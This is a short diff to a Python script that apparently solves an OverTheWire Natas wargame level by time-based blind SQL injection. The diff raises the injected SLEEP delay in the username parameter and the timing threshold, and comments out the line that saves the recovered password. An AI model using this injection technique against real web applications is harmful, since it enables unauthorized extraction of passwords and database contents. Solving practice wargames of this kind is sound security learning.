@@ -7,9 +7,10 @@ import time
 
 def req(x):
     s = time.perf_counter()
-    res = requests.get(url=url,auth=lvl_pass, params={'username':un_base+x+'"AND SLEEP(2);#'})
+    res = requests.get(url=url,auth=lvl_pass, params={'username':un_base+x+'"AND SLEEP(3);#'})
     serv = BeautifulSoup(res.text, 'html.parser').body.find('div').text.strip()
-    return x if 1.0 < time.perf_counter() - s else -1
+    print(time.perf_counter() - s)
+    return x if 3.0 < time.perf_counter() - s else -1
 
 
 def findLen(num):
@@ -64,7 +65,7 @@ pw = ""
 
 main()
 
-open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)
+#open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)
 
 
 '''
